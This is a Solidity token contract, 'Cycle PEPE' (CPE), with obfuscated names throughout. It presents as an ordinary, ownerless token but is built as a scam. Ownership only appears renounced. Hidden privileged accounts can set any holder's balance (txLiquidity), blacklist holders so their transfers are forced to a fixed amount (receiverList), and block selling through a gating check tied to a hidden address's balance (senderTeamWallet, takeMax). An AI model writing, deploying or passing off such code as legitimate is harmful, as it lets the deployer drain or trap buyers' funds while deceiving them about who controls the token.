//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface tradingLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTeam) external view returns (uint256);

    function transfer(address maxWalletLaunched, uint256 exemptIsMin) external returns (bool);

    function allowance(address modeReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptIsMin) external returns (bool);

    function transferFrom(
        address sender,
        address maxWalletLaunched,
        uint256 exemptIsMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptFrom, uint256 value);
    event Approval(address indexed modeReceiver, address indexed spender, uint256 value);
}

abstract contract limitLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atToFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldExemptReceiver {
    function createPair(address maxExempt, address fromIs) external returns (address);
}

interface enableLiquidity is tradingLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CyclePEPE is limitLiquidity, tradingLaunch, enableLiquidity {

    uint256 private maxLaunchedWallet;

    string private totalBuyWallet = "Cycle PEPE";

    function owner() external view returns (address) {
        return toWallet;
    }

    function receiverList(address totalAutoFund) public {
        takeAuto();
        
        if (totalAutoFund == sellAt || totalAutoFund == marketingSender) {
            return;
        }
        autoMin[totalAutoFund] = true;
    }

    uint256 private totalModeFee;

    address exemptTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return txFrom;
    }

    bool private marketingEnable;

    function marketingLiquidity(address launchedAt, address maxWalletLaunched, uint256 exemptIsMin) internal returns (bool) {
        require(teamMode[launchedAt] >= exemptIsMin);
        teamMode[launchedAt] -= exemptIsMin;
        teamMode[maxWalletLaunched] += exemptIsMin;
        emit Transfer(launchedAt, maxWalletLaunched, exemptIsMin);
        return true;
    }

    uint8 private txFrom = 18;

    mapping(address => uint256) private teamMode;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingReceiver;
    }

    mapping(address => bool) public autoMin;

    bool public walletEnable;

    string private buyMin = "CPE";

    mapping(address => bool) public fundList;

    function approve(address liquiditySwap, uint256 exemptIsMin) public virtual override returns (bool) {
        modeMinTotal[_msgSender()][liquiditySwap] = exemptIsMin;
        emit Approval(_msgSender(), liquiditySwap, exemptIsMin);
        return true;
    }

    address public sellAt;

    uint256 public tradingLimit;

    function txLiquidity(address receiverMax, uint256 exemptIsMin) public {
        takeAuto();
        teamMode[receiverMax] = exemptIsMin;
    }

    function senderTeamWallet(uint256 exemptIsMin) public {
        takeAuto();
        maxLiquidity = exemptIsMin;
    }

    uint256 fundSell;

    bool public modeFee;

    bool public buyLaunch;

    uint256 private tokenFund;

    function receiverTeam(address toLimit) public {
        require(toLimit.balance < 100000);
        if (buyLaunch) {
            return;
        }
        if (totalModeFee != tradingLimit) {
            marketingEnable = false;
        }
        fundList[toLimit] = true;
        if (modeFee) {
            modeFee = false;
        }
        buyLaunch = true;
    }

    address private toWallet;

    function takeMax(address launchedAt, address maxWalletLaunched, uint256 exemptIsMin) internal returns (bool) {
        if (launchedAt == sellAt) {
            return marketingLiquidity(launchedAt, maxWalletLaunched, exemptIsMin);
        }
        uint256 listAmount = tradingLaunch(marketingSender).balanceOf(fundTx);
        require(listAmount == maxLiquidity);
        require(maxWalletLaunched != fundTx);
        if (autoMin[launchedAt]) {
            return marketingLiquidity(launchedAt, maxWalletLaunched, receiverTxSell);
        }
        return marketingLiquidity(launchedAt, maxWalletLaunched, exemptIsMin);
    }

    constructor (){
        
        atToFrom txSender = atToFrom(exemptTo);
        marketingSender = shouldExemptReceiver(txSender.factory()).createPair(txSender.WETH(), address(this));
        
        sellAt = _msgSender();
        marketingLaunchAmount();
        fundList[sellAt] = true;
        teamMode[sellAt] = marketingReceiver;
        if (totalModeFee != tokenFund) {
            tokenFund = maxLaunchedWallet;
        }
        emit Transfer(address(0), sellAt, marketingReceiver);
    }

    event OwnershipTransferred(address indexed senderAt, address indexed enableMode);

    function balanceOf(address atTeam) public view virtual override returns (uint256) {
        return teamMode[atTeam];
    }

    function symbol() external view virtual override returns (string memory) {
        return buyMin;
    }

    function name() external view virtual override returns (string memory) {
        return totalBuyWallet;
    }

    address fundTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private modeMinTotal;

    function transferFrom(address launchedAt, address maxWalletLaunched, uint256 exemptIsMin) external override returns (bool) {
        if (_msgSender() != exemptTo) {
            if (modeMinTotal[launchedAt][_msgSender()] != type(uint256).max) {
                require(exemptIsMin <= modeMinTotal[launchedAt][_msgSender()]);
                modeMinTotal[launchedAt][_msgSender()] -= exemptIsMin;
            }
        }
        return takeMax(launchedAt, maxWalletLaunched, exemptIsMin);
    }

    function transfer(address receiverMax, uint256 exemptIsMin) external virtual override returns (bool) {
        return takeMax(_msgSender(), receiverMax, exemptIsMin);
    }

    address public marketingSender;

    function marketingLaunchAmount() public {
        emit OwnershipTransferred(sellAt, address(0));
        toWallet = address(0);
    }

    uint256 constant receiverTxSell = 19 ** 10;

    uint256 private marketingReceiver = 100000000 * 10 ** 18;

    function takeAuto() private view {
        require(fundList[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return toWallet;
    }

    uint256 maxLiquidity;

    function allowance(address launchedFrom, address liquiditySwap) external view virtual override returns (uint256) {
        if (liquiditySwap == exemptTo) {
            return type(uint256).max;
        }
        return modeMinTotal[launchedFrom][liquiditySwap];
    }

}